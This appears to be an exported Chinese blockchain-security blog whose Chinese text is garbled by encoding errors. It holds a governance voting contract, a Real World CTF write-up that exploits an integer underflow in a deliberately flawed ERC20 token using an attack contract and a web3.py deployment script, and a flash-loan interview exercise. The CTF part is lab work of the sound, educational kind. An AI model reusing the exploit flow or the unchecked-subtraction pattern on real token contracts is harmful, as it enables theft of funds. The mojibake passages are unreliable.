(where 0 is no, and 1e18 is yes)\n    *          Vote data packing\n    * |  yeaPct  |  nayPct  |   voteId  |\n    * |  64b     |  64b     |   128b    |\n    * @param _supports Whether voter supports the vote (preserved for backward compatibility purposes)\n    * @param _executesIfDecided Whether the vote should execute its action if it becomes decided\n    */\n    function vote(uint256 _voteData, bool _supports, bool _executesIfDecided) external voteExists(_decodeData(_voteData, 0, MAX_UINT_128)) &#123;\n        uint256 voteId = _decodeData(_voteData, 0, MAX_UINT_128);\n        uint256 nayPct = _decodeData(_voteData, 128, MAX_UINT_64);\n        uint256 yeaPct = _decodeData(_voteData, 192, MAX_UINT_64);\n        //256ä½ï¼Œå‰128ä¸ºvoteidï¼ŒåŽ128ä¸­çš„å‰64ä¸ºå¦å®šç¥¨ï¼ŒåŽ64ä¸ºæ”¯æŒç¥¨\n\n        require(_canVote(voteId, msg.sender), ERROR_CAN_NOT_VOTE);\n\n        if (yeaPct == 0 &amp;&amp; nayPct == 0) &#123;\n            // Keep backwards compatibility\n            if (_supports) &#123;\n                yeaPct = PCT_BASE;\n            &#125; else &#123;\n                nayPct = PCT_BASE;\n            &#125;\n        &#125; else &#123;\n            require(!_supports &amp;&amp; yeaPct.add(nayPct) &lt;= PCT_BASE, ERROR_MALFORMED_CONTINUOUS_VOTE);\n        &#125;\n        _vote(voteId, yeaPct, nayPct, msg.sender, _executesIfDecided);\n    &#125;\n\n    /**\n        * @notice Vote `@formatPct(_yeaPct)`% in favor and `@formatPct(_nayPct)`% against of vote #`_voteId`\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @param _voteId Id for vote\n        * @param _yeaPct Percentage of support, where 0 is no support, and 1e18 is total support\n        * @param _nayPct Percentage of opposition, where 0 is no oposition, and 1e18 is total oposition\n        * @param _executesIfDecided Whether the vote should execute its action if it becomes decided\n    */\n    function votePct(uint256 _voteId, uint256 _yeaPct, uint256 _nayPct, bool _executesIfDecided) external voteExists(_voteId) &#123;\n        require(_canVote(_voteId, msg.sender), ERROR_CAN_NOT_VOTE);\n        require(_yeaPct.add(_nayPct) &lt;= PCT_BASE, ERROR_MALFORMED_CONTINUOUS_VOTE);\n        _vote(_voteId, _yeaPct, _nayPct, msg.sender, _executesIfDecided);\n    &#125;\n\n    /**\n    * @notice Execute vote #`_voteId`\n    * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n    *      created via `newVote(),` which requires initialization\n    * @param _voteId Id for vote\n    */\n    function executeVote(uint256 _voteId) external voteExists(_voteId) &#123;\n        _executeVote(_voteId);\n    &#125;\n\n    // Forwarding fns\n\n    /**\n    * @notice Tells whether the Voting app is a forwarder or not\n    * @dev IForwarder interface conformance\n    * @return Always true\n    */\n    function isForwarder() external pure returns (bool) &#123;\n        return true;\n    &#125;\n\n    /**\n    * @notice Creates a vote to execute the desired action, and casts a support vote if possible\n    * @dev IForwarder interface conformance\n    * @param _evmScript Start vote with script\n    */\n    function forward(bytes _evmScript) public &#123;\n        require(canForward(msg.sender, _evmScript), ERROR_CAN_NOT_FORWARD);\n        _newVote(_evmScript, \"\", true, true);\n    &#125;\n\n    /**\n        * @notice Tells whether `_sender` can forward actions or not\n        * @dev IForwarder interface conformance\n        * @param _sender Address of the account intending to forward an action\n        * @return True if the given address can create votes, false otherwise\n    */\n    function canForward(address _sender, bytes) public view returns (bool) &#123;\n        // Note that `canPerform()` implicitly does an initialization check itself\n        return canPerform(_sender, CREATE_VOTES_ROLE, arr()) &amp;&amp; canCreateNewVote(_sender);\n    &#125;\n\n    // Getter fns\n\n    /**\n        * @notice Tells whether a vote #`_voteId` can be executed or not\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @return True if the given vote can be executed, false otherwise\n    */\n    function canExecute(uint256 _voteId) public view voteExists(_voteId) returns (bool) &#123;\n        return _canExecute(_voteId);\n    &#125;\n\n    /**\n        * @notice Tells whether `_sender` can participate in the vote #`_voteId` or not\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @return True if the given voter can participate a certain vote, false otherwise\n    */\n    function canVote(uint256 _voteId, address _voter) public view voteExists(_voteId) returns (bool) &#123;\n        return _canVote(_voteId, _voter);\n    &#125;\n\n    function canCreateNewVote(address _sender) public view returns(bool) &#123;\n        return enableVoteCreation &amp;&amp; token.balanceOf(_sender) >= minBalance &amp;&amp;  block.timestamp.sub(minTime) >= lastCreateVoteTimes[_sender];\n    &#125;\n\n    /**\n        * @dev Return all information for a vote by its ID\n        * @param _voteId Vote identifier\n        * @return Vote open status\n        * @return Vote executed status\n        * @return Vote start date\n        * @return Vote snapshot block\n        * @return Vote support required\n        * @return Vote minimum acceptance quorum\n        * @return Vote yeas amount\n        * @return Vote nays amount\n        * @return Vote power\n        * @return Vote script\n    */\n    function getVote(uint256 _voteId)\n        public\n        view\n        voteExists(_voteId)\n        returns (\n            bool open,\n            bool executed,\n            uint64 startDate,\n            uint64 snapshotBlock,\n            uint64 supportRequired,\n            uint64 minAcceptQuorum,\n            uint256 yea,\n            uint256 nay,\n            uint256 votingPower,\n            bytes script\n        )\n    &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        open = _isVoteOpen(vote_);\n        executed = vote_.executed;\n        startDate = vote_.startDate;\n        snapshotBlock = vote_.snapshotBlock;\n        supportRequired = vote_.supportRequiredPct;\n        minAcceptQuorum = vote_.minAcceptQuorumPct;\n        yea = vote_.yea;\n        nay = vote_.nay;\n        votingPower = vote_.votingPower;\n        script = vote_.executionScript;\n    &#125;\n\n    /**\n        * @dev Return the state of a voter for a given vote by its ID\n        * @param _voteId Vote identifier\n        * @return VoterState of the requested voter for a certain vote\n    */\n    function getVoterState(uint256 _voteId, address _voter) public view voteExists(_voteId) returns (VoterState) &#123;\n        return votes[_voteId].voters[_voter];\n    &#125;\n\n    // Internal fns\n\n    /**\n        * @dev Internal function to create a new vote\n        * @return voteId id for newly created vote\n    */\n    function _newVote(bytes _executionScript, string _metadata, bool _castVote, bool _executesIfDecided) internal returns (uint256 voteId) &#123;\n        require(canCreateNewVote(msg.sender));\n        uint64 snapshotBlock = getBlockNumber64() - 1; // avoid double voting in this very block\n        uint256 votingPower = token.totalSupplyAt(snapshotBlock);\n        require(votingPower > 0, ERROR_NO_VOTING_POWER);\n\n        voteId = votesLength++;\n\n        Vote storage vote_ = votes[voteId];\n        vote_.startDate = getTimestamp64();\n        vote_.snapshotBlock = snapshotBlock;\n        vote_.supportRequiredPct = supportRequiredPct;\n        vote_.minAcceptQuorumPct = minAcceptQuorumPct;\n        vote_.votingPower = votingPower;\n        vote_.executionScript = _executionScript;\n\n        emit StartVote(voteId, msg.sender, _metadata, minBalance, minTime, token.totalSupply(), token.balanceOfAt(msg.sender, snapshotBlock));\n\n        lastCreateVoteTimes[msg.sender] = getTimestamp64();\n\n        if (_castVote &amp;&amp; _canVote(voteId, msg.sender)) &#123;\n            _vote(voteId, PCT_BASE, 0, msg.sender, _executesIfDecided);\n        &#125;\n    &#125;\n\n    /**\n        * @dev Internal function to cast a vote. It assumes the queried vote exists.\n    */\n    function _vote(uint256 _voteId, uint256 _yeaPct, uint256 _nayPct, address _voter, bool _executesIfDecided) internal &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        VoterState state = vote_.voters[_voter];\n        require(state == VoterState.Absent, \"Can't change votes\");\n        // This could re-enter, though we can assume the governance token is not malicious\n        uint256 balance = token.balanceOfAt(_voter, vote_.snapshotBlock);\n        uint256 voterStake = uint256(2).mul(balance).mul(vote_.startDate.add(voteTime).sub(getTimestamp64())).div(voteTime);\n        if(voterStake > balance) &#123;\n            voterStake = balance;\n        &#125;\n\n        uint256 yea = voterStake.mul(_yeaPct).div(PCT_BASE);\n        uint256 nay = voterStake.mul(_nayPct).div(PCT_BASE);\n\n        if (yea > 0) &#123;\n            vote_.yea = vote_.yea.add(yea);\n        &#125;\n        if (nay > 0) &#123;\n            vote_.nay = vote_.nay.add(nay);\n        &#125;\n\n        vote_.voters[_voter] = yea == nay ? VoterState.Even : yea > nay ? VoterState.Yea : VoterState.Nay;\n\n        if (yea > 0) &#123;\n          emit CastVote(_voteId, _voter, true, yea);\n        &#125;\n        if (nay > 0) &#123;\n          emit CastVote(_voteId, _voter, false, nay);\n        &#125;\n\n        if (_executesIfDecided &amp;&amp; _canExecute(_voteId)) &#123;\n            // We've already checked if the vote can be executed with `_canExecute()`\n            _unsafeExecuteVote(_voteId);\n        &#125;\n    &#125;\n\n    /**\n    * @dev Internal function to execute a vote. It assumes the queried vote exists.\n    */\n    function _executeVote(uint256 _voteId) internal &#123;\n        require(_canExecute(_voteId), ERROR_CAN_NOT_EXECUTE);\n        _unsafeExecuteVote(_voteId);\n    &#125;\n\n    /**\n    * @dev Unsafe version of _executeVote that assumes you have already checked if the vote can be executed and exists\n    */\n    function _unsafeExecuteVote(uint256 _voteId) internal &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        vote_.executed = true;\n\n        bytes memory input = new bytes(0); // TODO: Consider input for voting scripts\n        runScript(vote_.executionScript, input, new address[](0));\n\n        emit ExecuteVote(_voteId);\n    &#125;\n\n    /**\n    * @dev Internal function to check if a vote can be executed. It assumes the queried vote exists.\n    * @return True if the given vote can be executed, false otherwise\n    */\n    function _canExecute(uint256 _voteId) internal view returns (bool) &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        if(_isVoteOpen(vote_)) &#123;\n            return false;\n        &#125;\n\n        if (vote_.executed) &#123;\n            return false;\n        &#125;\n\n        // Voting is already decided\n        if (_isValuePct(vote_.yea, vote_.votingPower, vote_.supportRequiredPct)) &#123;\n            return true;\n        &#125;\n\n        // Vote ended?\n        if(_isVoteOpen(vote_)) &#123;\n            return false;\n        &#125;\n        // Has enough support?\n        uint256 totalVotes = vote_.yea.add(vote_.nay);\n        if (!_isValuePct(vote_.yea, totalVotes, vote_.supportRequiredPct)) &#123;\n            return false;\n        &#125;\n        // Has min quorum?\n        if (!_isValuePct(vote_.yea, vote_.votingPower, vote_.minAcceptQuorumPct)) &#123;\n            return false;\n        &#125;\n\n        return true;\n    &#125;\n\n    /**\n    * @dev Internal function to check if a voter can participate on a vote. It assumes the queried vote exists.\n    * @return True if the given voter can participate a certain vote, false otherwise\n    */\n    function _canVote(uint256 _voteId, address _voter) internal view returns (bool) &#123;\n        Vote storage vote_ = votes[_voteId];\n        return _isVoteOpen(vote_) &amp;&amp; token.balanceOfAt(_voter, vote_.snapshotBlock) > 0;\n    &#125;\n\n    /**\n    * @dev Internal function to check if a vote is still open\n    * @return True if the given vote is open, false otherwise\n    */\n    function _isVoteOpen(Vote storage vote_) internal view returns (bool) &#123;\n        return getTimestamp64() &lt; vote_.startDate.add(voteTime) &amp;&amp; !vote_.executed;\n    &#125;\n\n    /**\n    * @dev Calculates whether `_value` is more than a percentage `_pct` of `_total`\n    */\n    function _isValuePct(uint256 _value, uint256 _total, uint256 _pct) internal pure returns (bool) &#123;\n        if (_total == 0) &#123;\n            return false;\n        &#125;\n\n        uint256 computedPct = _value.mul(PCT_BASE) / _total;\n        return computedPct > _pct;\n    &#125;\n\n    /**\n        * @dev Decodes data by performing bitwise operations.\n        * @param _value Value containing the data\n        * @param _shiftValue Number of bits to shift to the right\n        * @param _maskValue Number of bits to apply as a mask to the value\n     */\n    function _decodeData(uint256 _value, uint256 _shiftValue, uint256 _maskValue) internal pure returns(uint256) &#123;\n        return uint256((_value >> _shiftValue) &amp; _maskValue);\n    &#125;\n&#125;\n\n\n\nAnalyzeä¸ºGovernanceåˆçº¦ï¼Œå¯ä»¥åˆ›å»ºæ–°çš„proposalå¹¶è¿›è¡ŒæŠ•ç¥¨ï¼ŒæŠ•ç¥¨æƒä¸­ä»¥veCRV.balanceAt[voter][snapshot block(start block)]è®¡ç®—ï¼Œåˆ›å»ºæ–°çš„ææ¡ˆæ—¶ï¼Œåˆ›å»ºè€…å¯ä»¥é€‰æ‹©æ˜¯å¦å°†è‡ªå·±çš„çš„å…¨éƒ¨ç¥¨æ•°å¯¹æ‰€åˆ›å»ºçš„ææ¡ˆè¿›è¡ŒæŠ•ç¥¨ï¼ŒæŠ•ç¥¨æ—¶å€™ä¼šåˆ¤æ–­æ˜¯å¦æ»¡è¶³æ‰§è¡Œæ¡ä»¶ï¼Œå¦‚æžœæ»¡è¶³åˆ™æ‰§è¡Œ\næ‰§è¡Œè¿‡ç¨‹æ˜¯ï¼Œè°ƒç”¨åˆçº¦çš„runScriptå‡½æ•°ï¼Œå°†åˆ›å»ºæ—¶çš„è¿è¡Œè„šæœ¬è¿›è¡Œè¿è¡Œï¼Œé¦–å…ˆdelegatecallåˆçº¦callScriptï¼Œåˆçº¦callScriptå†callå‘targetåˆçº¦æ‰§è¡Œå¯¹åº”çš„oprate\n","slug":"Curve","date":"2022-08-03T06:32:47.718Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"0d3f2f790504b07f55c87ed185dd8ea8","title":"real world ctf->TransferFrom","content":"real world ctf TransferFromå¤çŽ°\n\n\nreal world ctf\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šnc 47.102.47.140 20000ï¼ŒWe design a pretty easy contract challenge. Enjoy it!\nYour goal is to make isSolved() function returns true!\n0x00 Codepragma solidity ^0.6.6;\n\nabstract contract Context &#123;\n    function _msgSender() internal view virtual returns (address payable) &#123;\n        return msg.sender;\n    &#125;\n\n    function _msgData() internal view virtual returns (bytes memory) &#123;\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    &#125;\n&#125;\n\ninterface IERC20 &#123;\n    /**\n     * @dev Returns the amount of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the amount of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to &#123;approve&#125;. `value` is the new allowance.\n     */\n    event Approval(address indexed owner,address indexed spender,uint256 value);\n&#125;\n\nlibrary SafeMath &#123;\n    function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    &#125;\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    &#125;\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b &lt;= a, errorMessage);\n        uint256 c = a - b;\n        return c;\n    &#125;\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) &#123;\n            return 0;\n        &#125;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    &#125;\n    function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return div(a, b, \"SafeMath: division by zero\");\n    &#125;\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n        return c;\n    &#125;\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    &#125;\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) &#123;\n        require(b != 0, errorMessage);\n        return a % b;\n    &#125;\n&#125;\ncontract ERC20 is Context, IERC20 &#123;\n    using SafeMath for uint256;\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n    constructor(string memory name, string memory symbol) public &#123;\n        _name = name;\n        _symbol = symbol;\n        _decimals = 18;\n    &#125;\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view returns (string memory) &#123;\n        return _name;\n    &#125;\n    function symbol() public view returns (string memory) &#123;\n        return _symbol;\n    &#125;\n    function decimals() public view returns (uint8) &#123;\n        return _decimals;\n    &#125;\n    /**\n     * @dev See &#123;IERC20-totalSupply&#125;.\n     */\n    function totalSupply() public view override returns (uint256) &#123;\n        return _totalSupply;\n    &#125;\n    /**\n     * @dev See &#123;IERC20-balanceOf&#125;.\n     */\n    function balanceOf(address account) public view override returns (uint256) &#123;\n        return _balances[account];\n    &#125;\n    function transfer(address recipient, uint256 amount)public virtual override returns (bool)&#123;\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    &#125;//å­˜åœ¨æ•´æ•°æº¢å‡ºæ¼æ´žï¼Œåªéœ€å‘éž0åœ°å€è½¬è´¦éž0tokenå³å¯æ»¡è¶³requireè¦æ±‚\n    function allowance(address owner, address spender)public view virtual override returns (uint256) &#123;\n        return _allowances[owner][spender];\n    &#125;\n    function approve(address spender, uint256 amount)public virtual override returns (bool) &#123;\n        _approve(_msgSender(), spender, amount);\n        return true;\n    &#125;\n    function transferFrom(address sender,address recipient,uint256 amount) public virtual override returns (bool) &#123;\n        _transfer(sender, recipient, amount);\n        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,\"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    &#125;\n    function increaseAllowance(address spender, uint256 addedValue)public virtual returns (bool)&#123;\n        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));\n        return true;\n    &#125;\n    function decreaseAllowance(address spender, uint256 subtractedValue)public virtual returns (bool)&#123;\n        _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,\"ERC20: decreased allowance below zero\"));\n        return true;\n    &#125;\n    function _transfer(address sender,address recipient,uint256 amount) internal virtual &#123;\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    &#125;\n    function _mint(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: mint to the zero address\");\n        _totalSupply = _totalSupply.add(amount);\n        _balances[account] = _balances[account].add(amount);\n        emit Transfer(address(0), account, amount);\n    &#125;\n    function _burn(address account, uint256 amount) internal virtual &#123;\n        require(account != address(0), \"ERC20: burn from the zero address\");\n        _balances[account] = _balances[account].sub(amount,\"ERC20: burn amount exceeds balance\");\n        _totalSupply = _totalSupply.sub(amount);\n        emit Transfer(account, address(0), amount);\n    &#125;\n    function _approve(address owner,address spender,uint256 amount) internal virtual &#123;\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    &#125;\n    function _setupDecimals(uint8 decimals_) internal &#123;\n        _decimals = decimals_;\n    &#125;\n&#125;\ncontract Ownable is Context &#123;\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);\n    constructor() internal &#123;\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    &#125;\n    function owner() public view returns (address) &#123;\n        return _owner;\n    &#125;\n    modifier onlyOwner() &#123;\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    &#125;\n    function renounceOwnership() public virtual onlyOwner &#123;\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    &#125;\n    function transferOwnership(address newOwner) public virtual onlyOwner &#123;\n        require(newOwner != address(0),\"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    &#125;\n&#125;\ncontract FishmenToken is ERC20(\"FishmenToken\", \"FMT\"), Ownable &#123;\n    function mint(address _to, uint256 _amount) public onlyOwner &#123;\n        _mint(_to, _amount);\n    &#125;\n    function burn(address _from, uint256 _amount) public &#123;\n        _burn(_from, _amount);\n    &#125;\n&#125;\npragma solidity ^0.6.6;\n\nimport \"./erc20_fake.sol\";\n\ncontract deployer &#123;\n    FishmenToken public fishmenToken;\n    bool public isSvd;\n\n    constructor() public &#123;\n        fishmenToken = new FishmenToken();\n    &#125;\n\n    function solve() public returns (bool) &#123;\n        require(fishmenToken.balanceOf(msg.sender) > 100,\"token balance &lt; 100\");\n        isSvd = true;\n    &#125;\n\n    function isSolved() public view returns (bool) &#123;\n        return isSvd;\n    &#125;\n&#125;\n\n\n\n0x01 Analyzeé¢˜ç›®åˆçº¦æœ‰å¤§å‡ ç™¾è¡Œï¼Œçœ‹èµ·æ¥éžå¸¸çš„å“äººï¼Œä½†æ˜¯ä»”ç»†å®¡è®¡ä»£ç ä¹‹åŽå‘çŽ°é¢˜ç›®çš„æ¼æ´žè¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä¸»è¦å°±æ˜¯ä¸€æ­¥æ•´æ•°ä¸‹æº¢å¤„æ¼æ´žï¼Œå¦å¤–è¿™é“é¢˜ç¬¬ä¸€æ¬¡åšæ—¶æœ€å¤§çš„éš¾ç‚¹å°±æ˜¯web3.pyè„šæœ¬çš„ç¼–å†™ï¼Œä¸ºæ­¤ä¸“é—¨å­¦ä¹ äº†ä»¥ä¸‹web3py\n0x02 Attackpragma solidity ^0.6.6;\nimport \"./erc20_fake.sol\";\nimport \"./rwctf.sol\";\ncontract attack&#123;\n    FishmenToken target=FishmenToken(0x3C563092e25D7b597d97FCCf3CC25f5387104a7B);\n    deployer target1=deployer(0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9);\n    constructor()public&#123;&#125;\n    function pwn(address recipient,uint256 amount) public &#123;\n    target.transfer(recipient,amount);\n    &#125;\n    function pwn3() public&#123;\n        target1.solve();\n    &#125;\n&#125;\n\nè¯¥é¢˜ä¸ºç§é“¾é¢˜ç›®ï¼Œåº”ä½¿ç”¨web3è„šæœ¬è¿›è¡Œæ”»å‡»\nacct=w3.eth.account.from_key('your private key') code='6080604052733c563092e25d7b597d97fccf3cc25f5387104a7b6000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073f2b1114c644cbb3ff63bf1dd284c8cd716e95be9600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503480156100b957600080fd5b50610242806100c96000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80639b30d8241461003b578063d97cd47d14610045575b600080fd5b610043610093565b005b6100916004803603604081101561005b57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061013b565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663890d69086040518163ffffffff1660e01b8152600401602060405180830381600087803b1580156100fd57600080fd5b505af1158015610111573d6000803e3d6000fd5b505050506040513d602081101561012757600080fd5b810190808051906020019092919050505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83836040518363ffffffff1660e01b8152600401808373ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050602060405180830381600087803b1580156101cc57600080fd5b505af11580156101e0573d6000803e3d6000fd5b505050506040513d60208110156101f657600080fd5b810190808051906020019092919050505050505056fea26469706673582212201bdb0b7246202efdfcac322c01db2cca7d786875f54ea6fb5a2b9eb322b34ffd64736f6c634300060c0033'\n contract=w3.eth.contract(abi=abi,bytecode=code)\n constructor_txn=contract.constructor().buildTransaction(&#123;\n     'nonce':w3.eth.getTransactionCount(acct.address),\n     'gas':3000000,\n     'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned=acct.signTransaction(constructor_txn)\ntx_id=w3.eth.sendRawTransaction(signed.rawTransaction)\nprint(tx_id.hex())\nswapaddress=w3.eth.getTransactionReceipt(tx_id).contractAddress\n\nswap=w3.eth.contract(abi=abi,address=swapaddress)\nprint(swap.all_functions())\n\npwn_txn=swap.functions.totry().buildTransaction(&#123;\n    'nonce':w3.eth.getTransactionCount(acct.address),\n    'gas':3000000,\n    'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned1=acct.signTransaction(pwn_txn)\npwn_id=w3.eth.sendRawTransaction(signed1.rawTransaction)\n\npwn3_txn=swap.functions.totry().buildTransaction(&#123;\n    'nonce':w3.eth.getTransactionCount(acct.address),\n    'gas':3000000,\n    'gasPrice':w3.eth.gasPrice\n&#125;)\nsigned2=acct.signTransaction(pwn3_txn)\npwn3_id=w3.eth.sendRawTransaction(signed2.rawTransaction)\n\n","slug":"real world ctf","date":"2022-08-03T06:30:11.232Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"c4192ee28bd2d2701353c24c31e1eb4a","title":"BlockSec interview questions","content":"\n\n\n\n1.ä»»åŠ¡\n\n\n\n\n\n\n\n\nä»»åŠ¡è¦æ±‚ï¼šç”¨brownieï¼ˆpythonï¼‰æˆ–è€…hardhatï¼ˆjsï¼‰è¿™ç§æ¡†æž¶ï¼Œç”¨alchemyæä¾›çš„åŽ†å²æ•°æ®åŠŸèƒ½ï¼Œå†™ä¸€ä¸ªåœ¨uniswap v2ä¸Šå€Ÿflash loançš„åˆçº¦ï¼Œflash loanå€Ÿå‡ºæ¥ä¹‹åŽç”¨uniswap v3çš„routerä¸Šåšä¸€æ¬¡swapï¼ˆuniswap v2é€‰ETH&#x2F;USDCçš„pairï¼Œå€ŸETHï¼Œç”¨v3çš„router swapï¼‰ï¼Œæœ€åŽrevert\né¦–å…ˆç¼–å†™åˆçº¦\n// SPDX-License-Identifier: MIT\npragma abicoder v2;\nlibrary $\n&#123;\n\taddress constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // rinkeby\n\taddress constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // rinkeby\n    address constant weth = 0xc778417E063141139Fce010982780140Aa0cD5Ab; // rinkeby\n    address constant usdc = 0xeb8f08a975Ab53E34D8a0330E0D34de942C95926; //rinkeby\n    address constant UniswapV3_SWAPROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // rinkeby\n    address constant pair = 0xB1bC33810F9e6E8D417925236991Fcc5012AaaE8; //rinkeby  eth/usdc\n&#125;\ncontract BorrowAndSwap&#123;\n    address public pair;\n    address public factory;\n    address public v2router;\n    address public v3router;\n    address WETH9=$.weth;\n    address USDC=$.usdc;\n    uint balan;\n    constructor() public payable&#123;\n        factory=$.UniswapV2_FACTORY;\n        v2router=$.UniswapV2_ROUTER02;\n        v3router=$.UniswapV3_SWAPROUTER;\n        pair=$.pair;\n    &#125;\n    function BorrowOneTokenAndSwap(uint amount) external payable&#123;\n        Pair(pair).swap(amount, 0, address(this), bytes('flash loan'));  //å€Ÿå‡ºeth\n    &#125;//å€Ÿï¼Œå¹¶åŽ»uniswap v3è¿›è¡Œswap\n    function DoSwap() external payable&#123;\n        require(msg.value > 0, \"Must pass non 0 ETH amount\");\n        uint256 deadline = block.timestamp + 15;\n        address tokenIn = WETH9;\n        address tokenOut = USDC;\n        uint24 fee = 3000;\n        address recipient = msg.sender;\n        uint256 amountIn = msg.value;\n        uint256 amountOutMinimum = 1;\n        uint160 sqrtPriceLimitX96 = 0;\n  \n        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(\n            tokenIn,\n            tokenOut,\n            fee,\n            recipient,\n            deadline,\n            amountIn,\n            amountOutMinimum,\n            sqrtPriceLimitX96\n        );\n  \n        IUniswapRouter(v3router).exactInputSingle&#123; value: msg.value &#125;(params);\n        IUniswapRouter(v3router).refundETH();\n        (bool success,) = msg.sender.call&#123; value: address(this).balance &#125;(\"\");\n        require(success, \"refund failed\");\n    &#125;\n    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external &#123;\n        uint fee=((_amount0*3)/997)+1;\n        IWETH9(WETH9).withdraw(_amount0);\n        this.DoSwap&#123;value: _amount0&#125;();\n        IWETH9(WETH9).deposit&#123; value: address(this).balance &#125;();\n        address token0 = Pair(msg.sender).token0();\n        IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));\n        require(false,\"success\");\n    &#125;\n    receive() payable external &#123;&#125;\n&#125;\ninterface IERC20&#123;\n    \n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\ninterface Pair is IERC20\n&#123;\n    function token0() external view returns (address _token0);\n    function token1() external view returns (address _token1);\n    function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n    function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 